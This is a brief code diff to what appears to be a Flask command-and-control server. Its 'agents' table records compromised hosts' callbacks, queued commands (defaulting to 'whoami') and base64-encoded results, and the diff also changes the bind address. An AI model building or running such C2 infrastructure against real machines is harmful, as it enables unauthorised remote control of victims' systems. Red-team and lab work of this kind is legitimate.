@@ -41,7 +41,17 @@ def init_db():
         return None
 
     cursor = conn.cursor() 
-    cursor.execute('''CREATE TABLE IF NOT EXISTS agents ( id SERIAL PRIMARY KEY, hostname TEXT UNIQUE NOT NULL, pid INTEGER, process_name TEXT, architecture TEXT, last_callback TIMESTAMP, command TEXT, result TEXT)''') 
+    cursor.execute('''
+CREATE TABLE IF NOT EXISTS agents (
+    id SERIAL PRIMARY KEY,
+    hostname TEXT UNIQUE NOT NULL,
+    pid INTEGER,
+    process_name TEXT,
+    architecture TEXT,
+    last_callback TIMESTAMP,
+    command TEXT DEFAULT 'whoami',
+    result TEXT
+)''')
     conn.commit() 
     cursor.close() 
     conn.close()
@@ -135,6 +145,7 @@ def bot(bot_id):
     cur.execute("SELECT result FROM agents WHERE id = %s", (bot_id,))
     encoded_data = cur.fetchone()
 
+
     decoded_bytes = base64.b64decode(encoded_data[0])
 
     decoded_data = ""
@@ -194,4 +205,4 @@ def logout():
 
 if __name__ == '__main__':
     init_db()
-    app.run(host='192.168.1.101', port=5000, debug=True)
+    app.run(host='192.168.1.100', port=5000, debug=True)
